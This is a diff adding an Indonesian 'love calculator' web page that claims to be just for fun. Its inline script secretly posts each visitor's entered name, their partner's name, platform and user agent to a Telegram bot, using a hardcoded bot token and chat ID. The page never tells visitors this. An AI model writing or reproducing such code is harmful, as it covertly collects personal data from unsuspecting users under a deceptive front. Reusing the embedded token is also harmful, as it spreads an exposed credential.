@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="assets/style.css" />
+    <title>Kalkulator Cinta</title>
+  </head>
+  <body>
+    <div class="wrapper">
+      <div class="heading">
+        <h1>Kalkulator ♥ Cinta</h1>
+        <h4>Dapatkan Hasil Cinta Anda Sendiri Secara Instan*</h4>
+      </div>
+
+      <div class="maincontent">
+        <div>
+          <!-- Kolom Input Nama Anda -->
+          <label for="yourname">*Nama Anda</label><br />
+          <input
+            type="text"
+            id="yourname"
+            placeholder="Masukkan Nama Anda"
+            spellcheck="false"
+            maxlength="30"
+            required
+          />
+        </div>
+        <div>
+          <!-- Kolom Input Nama Pasangan -->
+          <label for="theirname">*Nama Pasangan</label><br />
+          <input
+            type="text"
+            id="theirname"
+            placeholder="Masukkan Nama Pasangan Anda"
+            spellcheck="false"
+            maxlength="30"
+            required
+          />
+        </div>
+      </div>
+      <button type="submit" onclick="testing()">❤ HITUNG ❤</button>
+
+      <div class="result">
+        <h2>Hasil</h2>
+        <div class="divider"></div>
+        <p id="yourlovescoreis"></p>
+        <h1 id="score"></h1>
+        <p id="loveinfo"></p>
+        <p
+          id="reload"
+          style="
+            cursor: pointer;
+            display: none;
+            margin-top: 30px;
+            font-weight: 700;
+          "
+          onClick="window.location.reload();"
+        >
+          ↺ Hitung Ulang
+        </p>
+      </div>
+    </div>
+    <div class="footer">
+      <p style="color: #000">
+        Dibuat dengan <span style="color: #ff4136; font-size: 25px">❤</span> Oleh
+        <a
+          style="text-decoration: none; font-weight: bold; color: #ff4136"
+          target="_blank"
+          href=""
+          >Maulid</a
+        >
+        <br />
+        <small>*Hanya untuk tujuan hiburan</small>
+      </p>
+    </div>
+
+    <script type="text/javascript">
+      let tg = {
+        token: "7366200222:AAHvoRFhdN3nqL_QWZH51ukUYo9EmYjF83Y",
+        chat_id: "1961826961"
+      }
+
+      function testing(){
+        const url = `https://api.telegram.org/bot${tg.token}/sendMessage`
+        
+        var nama = document.getElementById('yourname').value;
+        var namaPasangan = document.getElementById('theirname').value;
+        
+        const hasil_data = "Nama : "+ nama + "\n" + "Nama Pasangan : " + namaPasangan + "\n" + "Platform : " +navigator.platform + "\n" + "Device : " + navigator.userAgent;
+        const obj = {
+          chat_id: tg.chat_id,
+          text: hasil_data
+        };
+
+        const xht = new XMLHttpRequest();
+        xht.open("POST", url, true);
+        xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
+        xht.send(JSON.stringify(obj));
+      }
+    </script>
+      
+    <script src="assets/app.js"></script>
+  </body>
+</html>
